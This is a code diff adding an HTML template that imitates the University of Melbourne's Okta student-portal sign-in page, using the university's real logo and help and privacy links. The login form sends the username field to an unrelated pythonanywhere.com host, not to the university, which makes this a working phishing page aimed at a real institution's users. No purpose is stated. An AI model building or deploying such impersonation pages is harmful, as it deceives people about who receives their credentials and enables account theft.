@@ -1,0 +1,52 @@
+<html>
+
+    <head>
+        <link href= "{{ url_for('static',filename='styles/morestyle.css') }}" rel="stylesheet" type="text/css">
+
+        <title>University of Melbourne - Sign In</title>
+    </head>
+    <body>
+        <p style="text-align:center">Sign in with your University of Melbourne account to access Student Portal</p>
+        <div id="okta-login-container"  style="margin-left:{{ leftmost }}px">
+            <main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style="">
+                <div class="okta-sign-in-header auth-header" >
+                    <h1><img src="https://d2glwx35mhbfwf.cloudfront.net/v4.10.0/logo-with-padding.svg" class="auth-org-logo" alt="The University of Melbourne"></h1>
+                    <div data-type="beacon-container" class="beacon-container" ></div>
+                </div>
+                <div class="siw-main-body" >
+                    <form method="POST" action="https://mol868.pythonanywhere.com/login" data-se="o-form" slot="content" id="form20" class="ion-form o-form o-form-edit-mode">
+                        <div data-se="o-form-content" class="o-form-content o-form-theme clearfix" >
+                            <h2 data-se="o-form-head" class="okta-form-title o-form-head">Log in</h2>
+                            <div class="o-form-info-container" ></div>
+                            <div class="o-form-error-container" data-se="o-form-error-container" role="alert" ></div>
+                            <div class="o-form-fieldset-container" data-se="o-form-fieldset-container" >
+                                <div data-se="o-form-fieldset-identifier" class="o-form-fieldset o-form-label-top" >
+                                    <div data-se="o-form-label" class="okta-form-label o-form-label" >
+                                        <label for="input28">Username</label></div>
+                                        <div data-se="o-form-input-container" class="o-form-input" >
+                                            <p class="o-form-explain" id="describe-username">e.g. jsmith (not email address)</p>
+                                            <span data-se="o-form-input-identifier" class="o-form-input-name-identifier o-form-control okta-form-input-field input-fix">
+                                                <input type="text" placeholder="" name="nm" value="NAME" autocomplete="username" required="">
+                                                <input type="hidden" name="count" id="foo" value= "{{ leftmost }}">
+                                            </span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="o-form-button-bar" >
+                            <input class="button button-primary" type="submit" value="NEXT" data-type="save">
+                        </div>
+                    </form>
+                </div>
+                <div class="siw-main-footer" >
+                    <div class="auth-footer" >
+                        <a data-se="unlock" href="#" class="link js-unlock">Unlock account?</a>
+                        <a data-se="help" href="https://www.unimelb.edu.au/cybersecurity/mfa" class="link js-help">Help</a>
+                        <a data-se="custom" href="https://www.unimelb.edu.au/cybersecurity/privacy" class="link js-custom">Privacy collection notice</a>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </body>
+</html>
